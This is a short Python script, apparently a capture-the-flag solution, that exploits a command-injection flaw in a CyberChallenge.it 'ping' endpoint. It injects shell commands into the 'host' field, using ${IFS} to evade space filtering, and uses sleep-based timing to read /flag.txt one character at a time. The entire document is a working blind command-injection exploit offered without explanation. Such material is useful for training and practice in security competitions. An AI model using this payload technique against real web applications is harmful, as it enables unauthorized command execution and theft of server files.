import requests
import string
import time

url = "http://basicrce.challs.cyberchallenge.it/ping"

charset = string.ascii_letters + string.digits + "{}_-"

flag = ""

for i in range(1, 50):
    found = False
    for c in charset:
        payload = f"127.0.0.1;cut${{IFS}}-c{i}${{IFS}}/flag.txt|grep${{IFS}}{c}&&sleep${{IFS}}2"
        
        data = {"host": payload}
        
        start = time.time()
        try:
            requests.post(url, json=data, timeout=1.5)
        except requests.exceptions.Timeout:
            flag += c
            print(flag)
            found = True
            break
    
    if not found:
        break

print("FLAG:", flag)
